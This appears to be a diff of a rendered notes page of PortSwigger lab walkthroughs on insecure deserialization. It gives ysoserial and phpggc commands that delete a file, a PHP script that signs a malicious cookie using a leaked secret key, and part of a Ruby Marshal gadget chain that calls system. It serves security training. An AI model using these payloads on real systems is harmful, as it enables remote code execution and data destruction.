+<span class="normal"><a href="#__codelineno-8-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-8-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-8-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-8-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-8-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-8-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-8-10">10</a></span>
+<span class="normal"><a href="#__codelineno-8-11">11</a></span>
+<span class="normal"><a href="#__codelineno-8-12">12</a></span>
+<span class="normal"><a href="#__codelineno-8-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a># Burp solution
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>1. Log in to your own account and observe that the session cookie contains a serialized Java object. Send a request containing your session cookie to Burp Repeater.
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a>2. Download the &quot;ysoserial&quot; tool and execute the following command. This generates a Base64-encoded serialized object containing your payload:
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6"></a>    - In Java versions 16 and above:
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7"></a>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8"></a>        `java -jar ysoserial-all.jar \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ CommonsCollections4 &#39;rm /home/carlos/morale.txt&#39; | base64`
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9"></a>    - In Java versions 15 and below:
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10"></a>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11"></a>        `java -jar ysoserial-all.jar CommonsCollections4 &#39;rm /home/carlos/morale.txt&#39; | base64`
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12"></a>3. In Burp Repeater, replace your session cookie with the malicious one you just created. Select the entire cookie and then URL-encode it.
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13"></a>4. Send the request to solve the lab.
+</span></code></pre></div></td></tr></table></div>
 <h2 id="exploiting-php-deserialization-with-a-pre-built-gadget-chain">Exploiting PHP deserialization with a pre-built gadget chain</h2>
 <p>PRACTITIONER <a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain">Exploiting PHP deserialization with a pre-built gadget chain</a></p>
 <h3 id="enunciation_5">Enunciation</h3>
@@ -17800,56 +17878,89 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p><strong>4.</strong> phpgcc has a gadget chain for that library</p>
 <p><img alt="Insecure deserialization" src="../../img/indes_18.png" /></p>
 <p><strong>5.</strong> Create your payload with:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>./phpggc Symfony/RCE4 exec &#39;rm /home/carlos/morale.txt&#39; | base64 -w 0 &gt; test.txt
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>./phpggc Symfony/RCE4 exec &#39;rm /home/carlos/morale.txt&#39; | base64 -w 0 &gt; test.txt
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="Insecure deserialization" src="../../img/indes_20.png" /></p>
 <p><strong>6.</strong> Construct a valid cookie containing this malicious object and sign it correctly using the secret key. Using this template:</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="cp">&lt;?php</span> 
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nv">$object</span> <span class="o">=</span> <span class="s2">&quot;OBJECT-GENERATED-BY-PHPGGC&quot;</span><span class="p">;</span> 
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="nv">$secretKey</span> <span class="o">=</span> <span class="s2">&quot;LEAKED-SECRET-KEY-FROM-PHPINFO.PHP&quot;</span><span class="p">;</span> 
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="s1">&#39;{&quot;token&quot;:&quot;&#39;</span> <span class="o">.</span> <span class="nv">$object</span> <span class="o">.</span> <span class="s1">&#39;&quot;,&quot;sig_hmac_sha1&quot;:&quot;&#39;</span> <span class="o">.</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">&#39;sha1&#39;</span><span class="p">,</span> <span class="nv">$object</span><span class="p">,</span> <span class="nv">$secretKey</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&quot;}&#39;</span><span class="p">);</span> 
-</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="k">echo</span> <span class="nv">$cookie</span><span class="p">;</span>
-</span></code></pre></div>
+<div class="language-php highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
+<span class="normal"><a href="#__codelineno-10-2">2</a></span>
+<span class="normal"><a href="#__codelineno-10-3">3</a></span>
+<span class="normal"><a href="#__codelineno-10-4">4</a></span>
+<span class="normal"><a href="#__codelineno-10-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="cp">&lt;?php</span> 
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="nv">$object</span> <span class="o">=</span> <span class="s2">&quot;OBJECT-GENERATED-BY-PHPGGC&quot;</span><span class="p">;</span> 
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a><span class="nv">$secretKey</span> <span class="o">=</span> <span class="s2">&quot;LEAKED-SECRET-KEY-FROM-PHPINFO.PHP&quot;</span><span class="p">;</span> 
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4"></a><span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="s1">&#39;{&quot;token&quot;:&quot;&#39;</span> <span class="o">.</span> <span class="nv">$object</span> <span class="o">.</span> <span class="s1">&#39;&quot;,&quot;sig_hmac_sha1&quot;:&quot;&#39;</span> <span class="o">.</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">&#39;sha1&#39;</span><span class="p">,</span> <span class="nv">$object</span><span class="p">,</span> <span class="nv">$secretKey</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&quot;}&#39;</span><span class="p">);</span> 
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5"></a><span class="k">echo</span> <span class="nv">$cookie</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Generate a file lab.php customizing the script. Use the $secretKey obtained in step 3. Use the payload generated in step 5 for the $object.</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="x">?php</span>
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="x">$object = &quot;Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRh&gt;</span>
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="x">$secretKey = &quot;cvb2w284adozzw3m2wgbhmxn7ezi9s4v&quot;;</span>
-</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="x">$cookie = urlencode(&#39;{&quot;token&quot;:&quot;&#39; . $object . &#39;&quot;,&quot;sig_hmac_sha1&quot;:&quot;&#39; . hash_hmac(&#39;sha1&#39;, $object, $secretKey) . &#39;&quot;}&#39;);</span>
-</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="x">echo $cookie;</span>
-</span></code></pre></div>
+<div class="language-php highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
+<span class="normal"><a href="#__codelineno-11-2">2</a></span>
+<span class="normal"><a href="#__codelineno-11-3">3</a></span>
+<span class="normal"><a href="#__codelineno-11-4">4</a></span>
+<span class="normal"><a href="#__codelineno-11-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="x">?php</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a><span class="x">$object = &quot;Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRh&gt;</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3"></a><span class="x">$secretKey = &quot;cvb2w284adozzw3m2wgbhmxn7ezi9s4v&quot;;</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4"></a><span class="x">$cookie = urlencode(&#39;{&quot;token&quot;:&quot;&#39; . $object . &#39;&quot;,&quot;sig_hmac_sha1&quot;:&quot;&#39; . hash_hmac(&#39;sha1&#39;, $object, $secretKey) . &#39;&quot;}&#39;);</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5"></a><span class="x">echo $cookie;</span>
+</span></code></pre></div></td></tr></table></div>
 <p><strong>7.</strong> Add permissions and run it:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>chmod +x lab.php
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>php lab.php
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span>
+<span class="normal"><a href="#__codelineno-12-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>chmod +x lab.php
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a>php lab.php
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="Insecure deserialization" src="../../img/indes_21.png" /></p>
 <p><strong>8.</strong> Place the generated cookie in the Coodie session in the Repeater and Send the request.</p>
 <p><img alt="Insecure deserialization" src="../../img/indes_22.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a># Burp solution
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>1. Log in and send a request containing your session cookie to Burp Repeater. Highlight the cookie and look at the **Inspector** panel.
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>2. Notice that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>3. Copy the decoded cookie from the **Inspector** and paste it into Decoder.
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>4. In Decoder, highlight the token and then select **Decode as &gt; Base64**. Notice that the token is actually a serialized PHP object.
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>5. In Burp Repeater, observe that if you try sending a request with a modified cookie, an exception is raised because the digital signature no longer matches. However, you should notice that:
-</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>    - A developer comment discloses the location of a debug file at `/cgi-bin/phpinfo.php`.
-</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>    - The error message reveals that the website is using the Symfony 4.3.6 framework.
-</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>6. Request the `/cgi-bin/phpinfo.php` file in Burp Repeater and observe that it leaks some key information about the website, including the `SECRET_KEY` environment variable. Save this key; you&#39;ll need it to sign your exploit later.
-</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>7. Download the &quot;PHPGGC&quot; tool and execute the following command:
-</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>
-</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>    `./phpggc Symfony/RCE4 exec &#39;rm /home/carlos/morale.txt&#39; | base64`
-</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>
-</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>    This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos&#39;s `morale.txt` file.
-</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>
-</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>8. You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:
-</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a>
-</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a>    - Assign the object you generated in PHPGGC to the `$object` variable.
-</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a>    - Assign the secret key that you copied from the `phpinfo.php` file to the `$secretKey` variable.
-</span><span id="__span-13-20"><a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a>
-</span><span id="__span-13-21"><a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a>    `&lt;?php $object = &quot;OBJECT-GENERATED-BY-PHPGGC&quot;; $secretKey = &quot;LEAKED-SECRET-KEY-FROM-PHPINFO.PHP&quot;; $cookie = urlencode(&#39;{&quot;token&quot;:&quot;&#39; . $object . &#39;&quot;,&quot;sig_hmac_sha1&quot;:&quot;&#39; . hash_hmac(&#39;sha1&#39;, $object, $secretKey) . &#39;&quot;}&#39;); echo $cookie;`
-</span><span id="__span-13-22"><a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a>
-</span><span id="__span-13-23"><a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a>    This will output a valid, signed cookie to the console.
-</span><span id="__span-13-24"><a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a>
-</span><span id="__span-13-25"><a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a>9. In Burp Repeater, replace your session cookie with the malicious one you just created, then send the request to solve the lab.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-13-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-13-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-13-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-13-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-13-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-13-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-13-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-13-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-13-10">10</a></span>
+<span class="normal"><a href="#__codelineno-13-11">11</a></span>
+<span class="normal"><a href="#__codelineno-13-12">12</a></span>
+<span class="normal"><a href="#__codelineno-13-13">13</a></span>
+<span class="normal"><a href="#__codelineno-13-14">14</a></span>
+<span class="normal"><a href="#__codelineno-13-15">15</a></span>
+<span class="normal"><a href="#__codelineno-13-16">16</a></span>
+<span class="normal"><a href="#__codelineno-13-17">17</a></span>
+<span class="normal"><a href="#__codelineno-13-18">18</a></span>
+<span class="normal"><a href="#__codelineno-13-19">19</a></span>
+<span class="normal"><a href="#__codelineno-13-20">20</a></span>
+<span class="normal"><a href="#__codelineno-13-21">21</a></span>
+<span class="normal"><a href="#__codelineno-13-22">22</a></span>
+<span class="normal"><a href="#__codelineno-13-23">23</a></span>
+<span class="normal"><a href="#__codelineno-13-24">24</a></span>
+<span class="normal"><a href="#__codelineno-13-25">25</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a># Burp solution
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a>1. Log in and send a request containing your session cookie to Burp Repeater. Highlight the cookie and look at the **Inspector** panel.
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3"></a>2. Notice that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4"></a>3. Copy the decoded cookie from the **Inspector** and paste it into Decoder.
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5"></a>4. In Decoder, highlight the token and then select **Decode as &gt; Base64**. Notice that the token is actually a serialized PHP object.
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6"></a>5. In Burp Repeater, observe that if you try sending a request with a modified cookie, an exception is raised because the digital signature no longer matches. However, you should notice that:
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7"></a>    - A developer comment discloses the location of a debug file at `/cgi-bin/phpinfo.php`.
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8"></a>    - The error message reveals that the website is using the Symfony 4.3.6 framework.
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9"></a>6. Request the `/cgi-bin/phpinfo.php` file in Burp Repeater and observe that it leaks some key information about the website, including the `SECRET_KEY` environment variable. Save this key; you&#39;ll need it to sign your exploit later.
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10"></a>7. Download the &quot;PHPGGC&quot; tool and execute the following command:
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11"></a>
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12"></a>    `./phpggc Symfony/RCE4 exec &#39;rm /home/carlos/morale.txt&#39; | base64`
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13"></a>
+</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14"></a>    This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos&#39;s `morale.txt` file.
+</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15"></a>
+</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16"></a>8. You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:
+</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17"></a>
+</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18"></a>    - Assign the object you generated in PHPGGC to the `$object` variable.
+</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19"></a>    - Assign the secret key that you copied from the `phpinfo.php` file to the `$secretKey` variable.
+</span><span id="__span-13-20"><a id="__codelineno-13-20" name="__codelineno-13-20"></a>
+</span><span id="__span-13-21"><a id="__codelineno-13-21" name="__codelineno-13-21"></a>    `&lt;?php $object = &quot;OBJECT-GENERATED-BY-PHPGGC&quot;; $secretKey = &quot;LEAKED-SECRET-KEY-FROM-PHPINFO.PHP&quot;; $cookie = urlencode(&#39;{&quot;token&quot;:&quot;&#39; . $object . &#39;&quot;,&quot;sig_hmac_sha1&quot;:&quot;&#39; . hash_hmac(&#39;sha1&#39;, $object, $secretKey) . &#39;&quot;}&#39;); echo $cookie;`
+</span><span id="__span-13-22"><a id="__codelineno-13-22" name="__codelineno-13-22"></a>
+</span><span id="__span-13-23"><a id="__codelineno-13-23" name="__codelineno-13-23"></a>    This will output a valid, signed cookie to the console.
+</span><span id="__span-13-24"><a id="__codelineno-13-24" name="__codelineno-13-24"></a>
+</span><span id="__span-13-25"><a id="__codelineno-13-25" name="__codelineno-13-25"></a>9. In Burp Repeater, replace your session cookie with the malicious one you just created, then send the request to solve the lab.
+</span></code></pre></div></td></tr></table></div>
 <h2 id="exploiting-ruby-deserialization-using-a-documented-gadget-chain">Exploiting Ruby deserialization using a documented gadget chain</h2>
 <p>PRACTITIONER <a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain">Exploiting Ruby deserialization using a documented gadget chain</a></p>
 <h3 id="enunciation_6">Enunciation</h3>
@@ -17861,86 +17972,161 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p><img alt="Insecure deserialization" src="../../img/indes_23.png" /></p>
 <p><strong>2.</strong> Find a documented vulnerability for that library at <a href="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html">https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html</a></p>
 <p><strong>3.</strong> Copy the original script:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a># Autoload the required classes
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>Gem::SpecFetcher
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>Gem::Installer
-</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
-</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a># prevent the payload from running when we Marshal.dump it
-</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>module Gem
-</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>  class Requirement
-</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>    def marshal_dump
-</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>      [@requirements]
-</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>    end
-</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>  end
-</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>end
-</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>
-</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>wa1 = Net::WriteAdapter.new(Kernel, :system)
-</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>
-</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>rs = Gem::RequestSet.allocate
-</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>rs.instance_variable_set(&#39;@sets&#39;, wa1)
-</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>rs.instance_variable_set(&#39;@git_set&#39;, &quot;id&quot;)
-</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>
-</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a>wa2 = Net::WriteAdapter.new(rs, :resolve)
-</span><span id="__span-14-21"><a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a>
-</span><span id="__span-14-22"><a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>i = Gem::Package::TarReader::Entry.allocate
-</span><span id="__span-14-23"><a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a>i.instance_variable_set(&#39;@read&#39;, 0)
-</span><span id="__span-14-24"><a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>i.instance_variable_set(&#39;@header&#39;, &quot;aaa&quot;)
-</span><span id="__span-14-25"><a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a>
-</span><span id="__span-14-26"><a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a>
-</span><span id="__span-14-27"><a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a>n = Net::BufferedIO.allocate
-</span><span id="__span-14-28"><a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a>n.instance_variable_set(&#39;@io&#39;, i)
-</span><span id="__span-14-29"><a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a>n.instance_variable_set(&#39;@debug_output&#39;, wa2)
-</span><span id="__span-14-30"><a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a>
-</span><span id="__span-14-31"><a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a>t = Gem::Package::TarReader.allocate
-</span><span id="__span-14-32"><a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a>t.instance_variable_set(&#39;@io&#39;, n)
-</span><span id="__span-14-33"><a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a>
-</span><span id="__span-14-34"><a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a>r = Gem::Requirement.allocate
-</span><span id="__span-14-35"><a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a>r.instance_variable_set(&#39;@requirements&#39;, t)
-</span><span id="__span-14-36"><a id="__codelineno-14-36" name="__codelineno-14-36" href="#__codelineno-14-36"></a>
-</span><span id="__span-14-37"><a id="__codelineno-14-37" name="__codelineno-14-37" href="#__codelineno-14-37"></a>payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
-</span><span id="__span-14-38"><a id="__codelineno-14-38" name="__codelineno-14-38" href="#__codelineno-14-38"></a>puts payload.inspect
-</span><span id="__span-14-39"><a id="__codelineno-14-39" name="__codelineno-14-39" href="#__codelineno-14-39"></a>puts Marshal.load(payload)
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-14-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-14-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-14-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-14-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-14-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-14-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-14-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-14-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-14-10">10</a></span>
+<span class="normal"><a href="#__codelineno-14-11">11</a></span>
+<span class="normal"><a href="#__codelineno-14-12">12</a></span>
+<span class="normal"><a href="#__codelineno-14-13">13</a></span>
+<span class="normal"><a href="#__codelineno-14-14">14</a></span>
+<span class="normal"><a href="#__codelineno-14-15">15</a></span>
+<span class="normal"><a href="#__codelineno-14-16">16</a></span>
+<span class="normal"><a href="#__codelineno-14-17">17</a></span>
